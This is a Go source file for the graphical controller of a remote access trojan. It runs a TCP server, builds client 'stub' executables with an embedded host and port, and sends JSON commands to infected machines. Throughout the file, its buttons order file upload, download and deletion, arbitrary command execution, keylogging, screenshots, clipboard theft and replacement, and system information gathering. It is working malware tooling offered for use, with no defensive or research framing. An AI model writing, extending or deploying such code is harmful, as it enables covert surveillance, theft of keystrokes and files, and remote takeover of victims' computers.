package rhandler

import (
	"encoding/json"
	"fmt"
	"guiv1/misc"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"guiv1/handlers/rathandler"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/cmd/fyne_settings/settings"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

var (
	f_   = misc.Funcs{}
	icns = misc.IconUtil{}
)

var (
	ServerAddress      = "0.0.0.0:1337"
	ClientActionOption = ""
	TcpServer          = rathandler.NewTCPServer()
)

type File struct {
	Name    string `json:"name"`
	Content string `json:"content"`
}

type ClientReply struct {
	Message string `json:"message"`
}

type NewClientCommand struct {
	Cmd  string   `json:"cmd"`
	Args []string `json:"args"`
}

func KillClientWindow(w fyne.Window, app fyne.App, title string, callback func(), icon fyne.Resource) {

	ModalContainer := container.NewVBox()
	ModalContainer.Layout = layout.NewVBoxLayout()
	if len(rathandler.Clients) > 0 {
		modal := app.NewWindow(title)
		modal.SetIcon(icon)
		ClientSelect := widget.NewSelect(rathandler.StringClients, func(option string) {
			ClientActionOption = option
		})
		ModalContainer.Add(ClientSelect)
		ConfirmBtn := widget.NewButton("Confirm", func() {
			callback()
			ClientSelect.Options = rathandler.StringClients
			ClientActionOption = ""
		})
		CloseBtn := widget.NewButton("Close", func() {
			modal.Hide()
		})
		ModalContainer.Add(ConfirmBtn)
		ModalContainer.Add(CloseBtn)
		modal.Resize(fyne.NewSize(400, 200))
		modal.SetFixedSize(true)
		modal.SetContent(ModalContainer)
		modal.Show()
	}
}
func NewClientTaskWindow(w fyne.Window, app fyne.App, title string, task func(), icon fyne.Resource, ConfirmTitle string, widgets ...fyne.CanvasObject) {

	ModalContainer := container.NewVBox()
	ModalContainer.Layout = layout.NewVBoxLayout()
	ClientInfoLabel := widget.NewLabel("")
	if len(rathandler.Clients) > 0 {
		modal := app.NewWindow(title)
		modal.SetIcon(icon)
		ClientSelect := widget.NewSelect(rathandler.StringClients, func(option string) {
			for _, client := range rathandler.Clients {
				if client.RemoteAddr().String() == option {
					ClientInfoLabel.SetText(fmt.Sprintf("Client Remote Addr: %s\nClient Local Addr: %s", client.RemoteAddr().String(), client.LocalAddr().String()))
					ModalContainer.Refresh()
					break

				}
			}
			ClientActionOption = option
		})
		ModalContainer.Add(ClientSelect)

		ConfirmBtn := widget.NewButton(ConfirmTitle, func() {
			task()
			ClientSelect.Options = rathandler.StringClients

		})
		CloseBtn := widget.NewButton("Close", func() {
			modal.Hide()
			ClientActionOption = ""
		})
		for _, widget := range widgets {
			ModalContainer.Add(widget)
		}
		ModalContainer.Add(ClientInfoLabel)
		ModalContainer.Add(ConfirmBtn)
		ModalContainer.Add(CloseBtn)

		modal.Resize(fyne.NewSize(500, 300))
		modal.SetFixedSize(true)
		modal.SetContent(ModalContainer)
		modal.Show()
	}
}
func NewClientFileExplorer(w fyne.Window, app fyne.App, conn net.Conn) {
	var ClientResponse ClientReply
	var FolderIcon = icns.Icons8("256", "desktop-folder.png", "fluency")
	modal := app.NewWindow("File Explorer")
	modal.SetIcon(icns.Icons8("256", "windows-explorer.png", "fluency"))
	BaseDir := "/"
	FileListView := container.New(layout.NewGridLayout(4))
	// json.NewEncoder(conn).Encode(NewClientCommand{
	// 	Cmd:  "chdir",
	// 	Args: []string{BaseDir},
	// })
	json.NewEncoder(conn).Encode(NewClientCommand{
		Cmd:  "lsdir",
		Args: []string{BaseDir},
	})
	resp := make([]byte, 1024)
	n, err := conn.Read(resp)
	if err != nil {
		log.Println("Error reading from connection:", err)
		return
	}
	json.Unmarshal(resp[:n], &ClientResponse)
	fileList := strings.Split(ClientResponse.Message, ",")
	for _, file := range fileList {
		NewFileBtn := widget.NewButtonWithIcon(file, FolderIcon, func() {})
		FileListView.Add(NewFileBtn)
	}
	modal.Resize(fyne.NewSize(800, 600))
	modal.SetContent(FileListView)
	modal.Show()
}

func NewPopupWindow(w fyne.Window, app fyne.App, title string, message string, icon fyne.Resource) {
	modal := app.NewWindow(title)
	modal.SetIcon(icon)
	content := container.NewVBox(
		widget.NewRichTextFromMarkdown(message),
		widget.NewButton("OK", func() {
			modal.Hide()
		}),
	)
	modal.Resize(fyne.NewSize(400, 150))
	modal.SetFixedSize(true)
	modal.SetContent(content)
	modal.CenterOnScreen()
	modal.Show()
}

func NewStubBuilderWindow(w fyne.Window, app fyne.App, title string, callback func(File)) {
	modal := app.NewWindow(title)
	modal.SetIcon(icns.Icons8("256", "spam.png", "fluency"))
	ModalContainer := container.NewVBox()
	ModalContainer.Layout = layout.NewVBoxLayout()

	StubNameEntry := widget.NewEntry()
	StubNameEntry.SetPlaceHolder(("Enter stub name"))

	StubHostEntry := widget.NewEntry()
	StubHostEntry.SetPlaceHolder("Enter host address")
	StubPortEntry := widget.NewEntry()
	StubPortEntry.SetPlaceHolder("Enter port number")

	ConfirmBtn := widget.NewButton("Create Stub", func() {
		stubName := StubNameEntry.Text
		stubHost := StubHostEntry.Text
		stubPort := StubPortEntry.Text
		StubFileDist := filepath.Join(stubName + ".exe")
		if stubName == "" || stubHost == "" || stubPort == "" {
			NewPopupWindow(w, app, "Error", "Please fill in all the required fields.", icns.Icons8("256", "error.png", "fluency"))
			return
		}
		StubFileContent, err := os.ReadFile(filepath.Join("stub", "stub.go"))
		if err != nil {
			log.Println("Error reading stub file:", err)
			return
		}
		stubnew := strings.ReplaceAll(string(StubFileContent), "{STUB_HOST}", stubHost)
		stubnew = strings.ReplaceAll(string(stubnew), "{STUB_PORT}", stubPort)
		file, err := os.OpenFile(filepath.Join("stub", "dist", stubName+".go"), os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Println("Error creating stub file:", err)
			return
		}
		_, err = file.Write([]byte(stubnew))
		if err != nil {
			log.Println("Error writing to stub file:", err)
			return
		}
		// base command to create the stub file
		os.Chdir(filepath.Join("stub", "dist"))
		stubCmd := exec.Command("go", "build", "-o", StubFileDist, stubName+".go")
		err = stubCmd.Run()
		if err != nil {
			NewPopupWindow(w, app, "Error", "Error building stub file: "+err.Error(), icns.Icons8("256", "error.png", "fluency"))
			return
		} else {
			// success, newpop up window to show the stub file location
			NewPopupWindow(w, app, "Success", "Stub file created at: "+filepath.Join("stub", "dist", stubName+".exe"), icns.Icons8("256", "ok--v1.png", "fluency"))
		}

	})
	content := container.NewVBox(
		StubNameEntry,
		StubHostEntry,
		StubPortEntry,
		ConfirmBtn,
	)
	modal.Resize(fyne.NewSize(400, 150))
	modal.SetFixedSize(true)
	modal.SetContent(content)
	modal.CenterOnScreen()
	modal.Show()
}

func NewRatHandler(w fyne.Window, app fyne.App) *fyne.Container {

	TcpServer.Addr = ServerAddress
	// w.Resize(fyne.NewSize(1000, 800))
	w.CenterOnScreen()

	rathandler.ConsoleLog.Scroll = container.ScrollBoth
	rathandler.ConsoleLog.TextStyle.Monospace = true
	rathandler.ConsoleLog.TextStyle.Bold = true
	rathandler.ConsoleLog.TextStyle.Symbol = true
	rathandler.ConsoleLog.Wrapping = fyne.TextWrapWord
	ConsoleScroll := container.NewScroll(rathandler.ConsoleLog)
	rathandler.ConsoleLog.OnChanged = func(text string) {
		rathandler.ConsoleLog.CursorRow = len(rathandler.ConsoleLog.Text) - 1
		ConsoleScroll.ScrollToBottom()
	}
	ToolBar_ExitBtn := widget.NewToolbarAction(icns.Icons8("256", "emergency-exit.png", "fluency"), func() {
		w.Close()

	})
	ToolBar_MainSettingsBtn := widget.NewToolbarAction(icns.Icons8("256", "services.png", "fluency"), func() {
		AppMainSettingsWindow := app.NewWindow("S7 Gui Settings")
		AppMainSettingsWindow.SetIcon(icns.Icon("appicon"))
		AppMainSettingsWindow.SetContent(settings.NewSettings().LoadAppearanceScreen(w))
		AppMainSettingsWindow.Resize(fyne.NewSize(440, 520))
		AppMainSettingsWindow.Show()

	})
	ToolBar_StubBuildBtn := widget.NewToolbarAction(icns.Icons8("256", "hammer-and-anvil.png", "fluency"), func() {
		NewStubBuilderWindow(w, app, "Create Stub", func(file File) {
			// Handle the created stub file here
		})
	})
	ToolBar_RefreshConnection := widget.NewToolbarAction(icns.Icons8("256", "recurring-appointment.png", "fluency"), func() {

	})
	ToolBar_ClearLogBtn := widget.NewToolbarAction(icns.Icons8("256", "erase.png", "fluency"), func() {
		rathandler.ConsoleLog.SetText("")
	})
	ToolBar_RunRatServerBtn := widget.NewToolbarAction(icns.Icons8("256", "play--v1.png", "fluency"), func() {

	})
	ToolBar_StopRatServerBtn := widget.NewToolbarAction(icns.Icons8("256", "stop--v1.png", "fluency"), func() {

	})

	ToolBar := widget.NewToolbar(
		ToolBar_ExitBtn,
		widget.NewToolbarSeparator(),
		ToolBar_MainSettingsBtn,
		ToolBar_StubBuildBtn,
		ToolBar_RefreshConnection,
		ToolBar_ClearLogBtn,
		widget.NewToolbarSpacer(),
		ToolBar_RunRatServerBtn,
		ToolBar_StopRatServerBtn,
	)

	NavBarLeft_CloseConnectionBtn := widget.NewButton("Close Connection", func() {
		KillClientWindow(w, app, "Close Connection", func() {
			for i, client := range rathandler.Clients {
				if ClientActionOption == client.RemoteAddr().String() {
					client.Close()
					NewPopupWindow(w, app, "Client Disconnected", fmt.Sprintf("# Client %s has been disconnected.", ClientActionOption), icns.Icons8("256", "disconnected--v1.png", "fluency"))
					rathandler.Clients = append(rathandler.Clients[:i], rathandler.Clients[i+1:]...)
					rathandler.StringClients = append(rathandler.StringClients[:i], rathandler.StringClients[i+1:]...)
				}
			}

		}, icns.Icons8("256", "disconnected--v1.png", "fluency"))

	})
	NavBarLeft_CloseAllConnectionsBtn := widget.NewButton("Close All Connections", func() {

	})
	NavBarLeft_CurrentDirectoryBtn := widget.NewButton("Current Directory", func() {
		var ClientResponsex ClientReply
		NewDirEntry := widget.NewEntry()
		NewDirEntry.PlaceHolder = "Enter new directory"
		ChangeDirBtn := widget.NewButton("Change Directory", func() {
			if NewDirEntry.Text == "" {
				NewPopupWindow(w, app, "Error", "Please enter a directory path.", icns.Icons8("256", "error.png", "fluency"))
				return
			}
			for _, client := range rathandler.Clients {
				if ClientActionOption == client.RemoteAddr().String() {
					json.NewEncoder(client).Encode(NewClientCommand{
						Cmd:  "chdir",
						Args: []string{NewDirEntry.Text},
					})
					response := make([]byte, 1024)
					n, err := client.Read(response)
					json.Unmarshal(response[:n], &ClientResponsex)
					if err != nil {
						TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
					} else {
						TcpServer.WriteLog(ClientResponsex.Message)
					}

				}
			}
		})

		NewExplorerBtn := widget.NewButton("Open File Explorer", func() {
			for _, client := range rathandler.Clients {
				if ClientActionOption == client.RemoteAddr().String() {
					NewClientFileExplorer(w, app, client)
				}
			}
		})
		NewExplorerBtn.Disable()
		ContainerVBox := container.NewVBox(NewDirEntry, ChangeDirBtn, NewExplorerBtn)
		var ClientResponse ClientReply
		NewClientTaskWindow(
			w,
			app,
			"Current Directory",
			func() {
				for _, client := range rathandler.Clients {
					if ClientActionOption == client.RemoteAddr().String() {
						json.NewEncoder(client).Encode(NewClientCommand{
							Cmd:  "cwd",
							Args: []string{},
						})
						response := make([]byte, 1024)
						n, err := client.Read(response)
						json.Unmarshal(response[:n], &ClientResponse)
						if err != nil {
							TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
						} else {
							TcpServer.WriteLog(fmt.Sprintf("Client: %s Current Directory: %s", ClientActionOption, ClientResponse.Message))
						}

					}
				}
			},
			icns.Icons8("256", "desktop-folder.png", "fluency"),
			"Get Client's Current Directory",
			ContainerVBox,
		)
	})
	NavBarLeft_ListDirectoryBtn := widget.NewButton("List Directory", func() {
		var ClientResponse ClientReply
		DirectoryToListEntry := widget.NewEntry()
		DirectoryToListEntry.PlaceHolder = "Enter directory to list"
		NewClientTaskWindow(
			w,
			app,
			"List Current Directory",
			func() {
				if DirectoryToListEntry.Text == "" {
					DirectoryToListEntry.Text = "."
				}
				for _, client := range rathandler.Clients {
					if ClientActionOption == client.RemoteAddr().String() {
						fmt.Println("Listing directory for client:", DirectoryToListEntry.Text)
						json.NewEncoder(client).Encode(NewClientCommand{
							Cmd:  "lsdir",
							Args: []string{DirectoryToListEntry.Text},
						})
						response := make([]byte, 1024)
						n, err := client.Read(response)
						json.Unmarshal(response[:n], &ClientResponse)
						if err != nil {
							TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
						} else {
							TcpServer.WriteLog(fmt.Sprintf("Client: %s Current Directory Files:\n %s", ClientActionOption, strings.Join(strings.Split(ClientResponse.Message, ","), "\n")))
						}

					}
				}
			},
			icns.Icons8("256", "folder-tree.png", "fluency"),
			"Get Client's Files List",
			DirectoryToListEntry,
		)
	})
	NavBarLeft_UploadFileBtn := widget.NewButton("Upload File", func() {
		var ClientResponse ClientReply
		FileToUploadEntry := widget.NewEntry()
		FileToUploadEntry.PlaceHolder = "Enter file path to upload"
		NewClientTaskWindow(
			w,
			app,
			"Upload File",
			func() {
				if FileToUploadEntry.Text == "" {
					NewPopupWindow(w, app, "Error", "Please enter a file path to upload.", icns.Icons8("256", "error.png", "fluency"))
					TcpServer.WriteLog("No file path provided for upload.")
					return
				}
				for _, client := range rathandler.Clients {
					if ClientActionOption == client.RemoteAddr().String() {
						filePath := FileToUploadEntry.Text
						json.NewEncoder(client).Encode(NewClientCommand{
							Cmd:  "upfile",
							Args: []string{filePath},
						})
						response := make([]byte, 1024)
						n, err := client.Read(response)
						json.Unmarshal(response[:n], &ClientResponse)

						if err != nil {
							TcpServer.WriteLog(fmt.Sprintf("Error decoding client response: %v", err))
						} else {
							TcpServer.WriteLog(fmt.Sprintf("Client: %s File Upload Response: %s", ClientActionOption, ClientResponse.Message))
						}

					}
				}
			},
			icns.Icons8("256", "upload--v16.png", "fluency"),
			"Upload File to Server",
			FileToUploadEntry,
		)

	})
	NavBarLeft_DownloadFileBtn := widget.NewButton("Download File", func() {
		FileToDownloadEntry := widget.NewEntry()
		FileToDownloadEntry.PlaceHolder = "Enter file path to download"
		ClientSavePathEntry := widget.NewEntry()
		ClientSavePathEntry.PlaceHolder = "Enter save path on client"
		Container := container.NewVBox(FileToDownloadEntry, ClientSavePathEntry)
		NewClientTaskWindow(
			w,
			app,
			"Download File",
			func() {
				if FileToDownloadEntry.Text == "" || ClientSavePathEntry.Text == "" {
					TcpServer.WriteLog("Please enter both the file path to download and the save path on the client.")
					NewPopupWindow(w, app, "Error", "Please enter both the file path to download and the save path on the client.", icns.Icons8("256", "error.png", "fluency"))
					return
				}
				for _, client := range rathandler.Clients {
					if ClientActionOption == client.RemoteAddr().String() {
						var ClientResponse ClientReply
						json.NewEncoder(client).Encode(NewClientCommand{
							Cmd:  "dlfile",
							Args: []string{FileToDownloadEntry.Text, ClientSavePathEntry.Text},
						})
						response := make([]byte, 1024)
						n, err := client.Read(response)
						json.Unmarshal(response[:n], &ClientResponse)
						if err != nil {
							TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
						} else {
							TcpServer.WriteLog(fmt.Sprintf("Client: %s File Download Response: %s", ClientActionOption, ClientResponse.Message))
						}
					}
				}

			},
			icns.Icons8("256", "download.png", "fluency"),
			"Download File from Server",
			Container,
		)
	})
	NavBarLeft_DeleteFileBtn := widget.NewButton("Delete File", func() {
		FileToDeleteEntry := widget.NewEntry()
		FileToDeleteEntry.PlaceHolder = "Enter file path to delete"
		NewClientTaskWindow(
			w,
			app,
			"Delete File",
			func() {
				if FileToDeleteEntry.Text == "" {
					TcpServer.WriteLog("Please enter a file path to delete.")
					NewPopupWindow(w, app, "Error", "Please enter a file path to delete.", icns.Icons8("256", "error.png", "fluency"))
					return
				}
				for _, client := range rathandler.Clients {
					if ClientActionOption == client.RemoteAddr().String() {
						var ClientResponse ClientReply
						filePath := FileToDeleteEntry.Text
						json.NewEncoder(client).Encode(NewClientCommand{
							Cmd:  "delfile",
							Args: []string{filePath},
						})
						response := make([]byte, 1024)
						n, err := client.Read(response)
						json.Unmarshal(response[:n], &ClientResponse)
						if err != nil {
							TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
						} else {
							TcpServer.WriteLog(fmt.Sprintf("Client: %s File Delete Response: %s", ClientActionOption, ClientResponse.Message))
						}
					}
				}
			},
			icns.Icons8("256", "delete.png", "fluency"),
			"Delete File from client",
			container.NewVBox(FileToDeleteEntry),
		)
	})
	NavBarLeft_ExecuteCommandBtn := widget.NewButton("Execute Command", func() {
		CommandToExecuteEntry := widget.NewEntry()
		CommandToExecuteEntry.PlaceHolder = "Enter command to execute"
		NewClientTaskWindow(
			w,
			app,
			"Execute Command",
			func() {
				if CommandToExecuteEntry.Text == "" {
					TcpServer.WriteLog("Please enter a command to execute.")
					NewPopupWindow(w, app, "Error", "Please enter a command to execute.", icns.Icons8("256", "error.png", "fluency"))
					return
				}
				for _, client := range rathandler.Clients {
					if ClientActionOption == client.RemoteAddr().String() {
						var ClientResponse ClientReply
						command := CommandToExecuteEntry.Text
						json.NewEncoder(client).Encode(NewClientCommand{
							Cmd:  "exec",
							Args: []string{command},
						})
						response := make([]byte, 1024)
						n, err := client.Read(response)
						json.Unmarshal(response[:n], &ClientResponse)
						if err != nil {
							TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
						} else {
							TcpServer.WriteLog(fmt.Sprintf("Client: %s Command Execution Response:\n%s", ClientActionOption, ClientResponse.Message))
						}
					}
				}
			},
			icns.Icons8("256", "command-line.png", "fluency"),
			"Execute Command on Client",
			container.NewVBox(CommandToExecuteEntry),
		)
	})
	NavBarLeft_KeyLoggerBtn := widget.NewButton("Key Logger", func() {
		NewClientTaskWindow(w, app, "Key Logger", func() {
			for i, client := range rathandler.Clients {
				if ClientActionOption == client.RemoteAddr().String() {
					json.NewEncoder(client).Encode(NewClientCommand{
						Cmd:  "klogstart",
						Args: []string{strconv.Itoa(i)},
					})
					var ClientResponse ClientReply
					response := make([]byte, 1024)
					n, err := client.Read(response)
					if err != nil {
						TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
					} else {
						json.Unmarshal(response[:n], &ClientResponse)
						TcpServer.WriteLog(fmt.Sprintf("Client: %s Key Logger Data: %s", ClientActionOption, ClientResponse.Message))
					}
				}
			}

		}, icns.Icons8("256", "grand-master-key.png", "fluency"),
			"Start KeyLogger",
			container.NewVBox(
				widget.NewButton("Stop KeyLogger", func() {
					for i, client := range rathandler.Clients {
						if ClientActionOption == client.RemoteAddr().String() {
							json.NewEncoder(client).Encode(NewClientCommand{
								Cmd:  "klogstop",
								Args: []string{strconv.Itoa(i)},
							})
							var ClientResponse ClientReply
							response := make([]byte, 1024)
							n, err := client.Read(response)
							if err != nil {
								TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
							} else {
								json.Unmarshal(response[:n], &ClientResponse)
								TcpServer.WriteLog(fmt.Sprintf("Client: %s Key Logger Data: %s", ClientActionOption, ClientResponse.Message))
							}
						}
					}
				}),
			),
		)
	})
	NavBarLeft_ScreenshotBtn := widget.NewButton("Screenshot", func() {
		DisplayIdEntry := widget.NewEntry()
		DisplayIdEntry.PlaceHolder = "Enter display ID to capture screenshot"
		Container := container.NewVBox(DisplayIdEntry)
		NewClientTaskWindow(
			w,
			app,
			"Screenshot",
			func() {
				if DisplayIdEntry.Text == "" {
					DisplayIdEntry.SetText("0")
				}
				for _, client := range rathandler.Clients {
					if ClientActionOption == client.RemoteAddr().String() {
						var ClientResponse ClientReply
						json.NewEncoder(client).Encode(NewClientCommand{
							Cmd:  "screenshot",
							Args: []string{string(strings.ReplaceAll(time.Now().Format("2006-01-02_15-04-05"), " ", "_")), DisplayIdEntry.Text},
						})
						response := make([]byte, 1024)
						n, err := client.Read(response)
						if err != nil {
							TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
						} else {
							json.Unmarshal(response[:n], &ClientResponse)
							TcpServer.WriteLog(fmt.Sprintf("Client: %s Screenshot Data: %s", ClientActionOption, ClientResponse.Message))
						}
					}
				}
			},
			icns.Icons8("256", "take-screenshot.png", "fluency"),
			"Take Screenshot",
			Container,
		)

	})
	NavBarLeft_WebCamCaptureBtn := widget.NewButton("WebCam Capture", func() {
	})
	NavBarLeft_MicrophoneCaptureBtn := widget.NewButton("Microphone Capture", func() {
	})
	NavBarLeft_ClipBoardCaptureBtn := widget.NewButton("Clipboard", func() {
		ReplaceClipboardContentEntry := widget.NewEntry()
		ReplaceClipboardContentEntry.PlaceHolder = "Enter text to replace clipboard content"
		ReplaceClipBoardBtn := widget.NewButton("Replace Clipboard Content", func() {
			for _, client := range rathandler.Clients {
				if ClientActionOption == client.RemoteAddr().String() {
					json.NewEncoder(client).Encode(NewClientCommand{
						Cmd:  "clipboardGT",
						Args: []string{ReplaceClipboardContentEntry.Text},
					})
					var ClientResponse ClientReply
					response := make([]byte, 1024)
					n, err := client.Read(response)
					if err != nil {
						TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
					} else {
						json.Unmarshal(response[:n], &ClientResponse)
						TcpServer.WriteLog(fmt.Sprintf("Client: %s Clipboard Content Replaced:\n%s", ClientActionOption, ClientResponse.Message))
					}
				}
			}
		})

		Container := container.NewVBox(ReplaceClipboardContentEntry, ReplaceClipBoardBtn)
		NewClientTaskWindow(
			w,
			app,
			"Clipboard",
			func() {
				if ReplaceClipboardContentEntry.Text == "" {
					TcpServer.WriteLog("No text provided to replace clipboard content")
					NewPopupWindow(w, app, "Clipboard", "Please enter text to replace clipboard content", icns.Icons8("256", "add-to-clipboard.png", "fluency"))
				}
				for _, client := range rathandler.Clients {
					if ClientActionOption == client.RemoteAddr().String() {
						json.NewEncoder(client).Encode(NewClientCommand{
							Cmd:  "clipboardST",
							Args: []string{ReplaceClipboardContentEntry.Text},
						})
						var ClientResponse ClientReply
						response := make([]byte, 1024)
						n, err := client.Read(response)
						if err != nil {
							TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
						} else {
							json.Unmarshal(response[:n], &ClientResponse)
							TcpServer.WriteLog(fmt.Sprintf("Client: %s Clipboard Data:\n%s", ClientActionOption, ClientResponse.Message))
						}
					}
				}
			},
			icns.Icons8("256", "add-to-clipboard.png", "fluency"),
			"Grab Clipboard",
			Container,
		)
	})
	NavBarLeft_SystemInformationBtn := widget.NewButton("System Information", func() {
		NewClientTaskWindow(
			w,
			app,
			"System Information",
			func() {
				for _, client := range rathandler.Clients {
					if ClientActionOption == client.RemoteAddr().String() {
						json.NewEncoder(client).Encode(NewClientCommand{
							Cmd: "sysinfo",
						})
						var ClientResponse ClientReply
						response := make([]byte, 2048)
						n, err := client.Read(response)
						if err != nil {
							TcpServer.WriteLog(fmt.Sprintf("Error reading from client: %v", err))
						} else {
							json.Unmarshal(response[:n], &ClientResponse)
							TcpServer.WriteLog(fmt.Sprintf("Client: %s System Information:\n%s", ClientActionOption, ClientResponse.Message))
						}
					}
				}
			},
			icns.Icons8("256", "system-information.png", "fluency"),
			"Get System Information",
		)
	})
	NavBarLeft_NetworkInformationBtn := widget.NewButton("Network Information", func() {
	})
	NavBarLeft_ShutdownSystemBtn := widget.NewButton("Shutdown System", func() {
	})
	NavBarLeft_CloseConnectionBtn.SetIcon(icns.Icons8("256", "disconnected--v1.png", "fluency"))
	NavBarLeft_CloseAllConnectionsBtn.SetIcon(icns.Icons8("256", "delete-shield.png", "fluency"))
	NavBarLeft_CurrentDirectoryBtn.SetIcon(icns.Icons8("256", "desktop-folder.png", "fluency"))
	NavBarLeft_ListDirectoryBtn.SetIcon(icns.Icons8("256", "folder-tree.png", "fluency"))
	NavBarLeft_UploadFileBtn.SetIcon(icns.Icons8("256", "upload--v16.png", "fluency"))
	NavBarLeft_DownloadFileBtn.SetIcon(icns.Icons8("256", "download.png", "fluency"))
	NavBarLeft_DeleteFileBtn.SetIcon(icns.Icons8("256", "delete-property.png", "fluency"))
	NavBarLeft_ExecuteCommandBtn.SetIcon(icns.Icons8("256", "command-line.png", "fluency"))
	NavBarLeft_KeyLoggerBtn.SetIcon(icns.Icons8("256", "grand-master-key.png", "fluency"))
	NavBarLeft_ScreenshotBtn.SetIcon(icns.Icons8("256", "take-screenshot.png", "fluency"))
	NavBarLeft_WebCamCaptureBtn.SetIcon(icns.Icons8("256", "webcam.png", "fluency"))
	//NavBarLeft_WebCamCaptureBtn.Disable()
	NavBarLeft_MicrophoneCaptureBtn.SetIcon(icns.Icons8("256", "microphone.png", "fluency"))
	//NavBarLeft_MicrophoneCaptureBtn.Disable()
	NavBarLeft_ClipBoardCaptureBtn.SetIcon(icns.Icons8("256", "add-to-clipboard.png", "fluency"))
	NavBarLeft_SystemInformationBtn.SetIcon(icns.Icons8("256", "system-information.png", "fluency"))
	NavBarLeft_NetworkInformationBtn.SetIcon(icns.Icons8("256", "wired-network-connection.png", "fluency"))
	//NavBarLeft_NetworkInformationBtn.Disable()
	NavBarLeft_ShutdownSystemBtn.SetIcon(icns.Icons8("256", "shutdown.png", "fluency"))
	//NavBarLeft_ShutdownSystemBtn.Disable()
	NavBarLeft := container.NewVBox(
		widget.NewLabelWithStyle("Command Options", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		widget.NewSeparator(),
		NavBarLeft_CloseConnectionBtn,
		NavBarLeft_CloseAllConnectionsBtn,
		NavBarLeft_CurrentDirectoryBtn,
		NavBarLeft_ListDirectoryBtn,
		NavBarLeft_UploadFileBtn,
		NavBarLeft_DownloadFileBtn,
		NavBarLeft_DeleteFileBtn,
		NavBarLeft_ExecuteCommandBtn,
		NavBarLeft_KeyLoggerBtn,
		NavBarLeft_ScreenshotBtn,
		NavBarLeft_WebCamCaptureBtn,
		NavBarLeft_MicrophoneCaptureBtn,
		NavBarLeft_ClipBoardCaptureBtn,
		NavBarLeft_SystemInformationBtn,
		NavBarLeft_NetworkInformationBtn,
		NavBarLeft_ShutdownSystemBtn,
	)
	BottomStatusText := widget.NewLabelWithStyle("Connection Status: Disconnected", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	BottomServerAddressText := widget.NewLabelWithStyle("Server Address: N/A", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	BottomServerStatusText := widget.NewLabelWithStyle("Server Status: Offline", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	go func() {
		for {
			BottomStatusText.SetText("Connected Clients: " + strconv.Itoa(len(rathandler.Clients)))
			time.Sleep(2 * time.Second)
		}
	}()
	ToolBar_RefreshConnection.OnActivated = func() {
		TcpServer.MonitorClients()
		BottomStatusText.SetText("Connected Clients: " + strconv.Itoa(len(rathandler.Clients)))
	}
	ServerInfoContainer := container.NewGridWithColumns(
		2,
		BottomServerAddressText,
		BottomServerStatusText,
	)
	ClientInfoContainer := container.NewGridWithColumns(
		1,
		BottomStatusText,
	)
	ServerInfoContainer.Layout = layout.NewGridLayoutWithColumns(2)
	ClientInfoContainer.Layout = layout.NewGridLayoutWithColumns(3)
	BottomInfoContainer := container.NewVBox(
		widget.NewSeparator(),
		container.NewHBox(
			ServerInfoContainer,
			layout.NewSpacer(),
			ClientInfoContainer,
		),
	)
	BottomInfoContainer.Layout = layout.NewVBoxLayout()

	ToolBar_RunRatServerBtn.OnActivated = func() {
		err := TcpServer.Start()
		if err != nil {
			TcpServer.WriteLog(fmt.Sprintf("Error starting RAT server: %v", err))
			log.Println("Error starting RAT server:", err)
		}
		BottomServerStatusText.SetText("Server Status: Online")
		BottomServerAddressText.SetText(fmt.Sprintf("Server Address: %s", ServerAddress))
		BottomInfoContainer.Refresh()

	}
	ToolBar_StopRatServerBtn.OnActivated = func() {
		err := TcpServer.Stop()
		if err != nil {
			TcpServer.WriteLog(fmt.Sprintf("Error stopping RAT server: %v", err))
			log.Println("Error stopping RAT server:", err)
		}
		BottomServerStatusText.SetText("Server Status: Offline")
		BottomServerAddressText.SetText("Server Address: N/A")
		BottomInfoContainer.Refresh()

	}
	ToolBar_ClearLogBtn.OnActivated = func() {
		rathandler.ConsoleLog.SetText("")
	}
	ToolBarContainer := container.NewVBox(
		ToolBar,
		widget.NewSeparator(),
	)
	ToolBarContainer.Refresh()
	ToolBar.Refresh()
	BorderContainer := container.NewBorder(
		ToolBarContainer,
		BottomInfoContainer,
		NavBarLeft,
		nil,
		ConsoleScroll,
	)

	return BorderContainer
}
